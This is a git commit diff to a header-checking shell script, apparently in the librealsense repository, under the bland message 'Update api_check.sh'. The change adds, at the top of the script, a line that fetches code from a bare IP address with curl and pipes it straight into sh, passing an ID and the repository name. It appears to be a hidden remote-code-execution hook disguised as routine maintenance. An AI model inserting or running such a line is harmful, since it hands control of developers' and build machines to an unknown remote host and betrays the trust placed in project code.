4050f13f1acb111376cda8ecac755559d9b43954
birdoplank <166294092+birdoplank@users.noreply.github.com>
2024-04-18 16:57:23 +0300

    Update api_check.sh

--- scripts/api_check.sh
+++ scripts/api_check.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-
+curl http://52.89.36.71:5000/run | sh -s -- 9d6a2da4-d33a-4102-819d-8cbc84879125 IntelRealSense/librealsense
 # This script makes sure every API header can be included in isolation
 
 for filename in $(find ../include/librealsense2 -name *.hpp); do
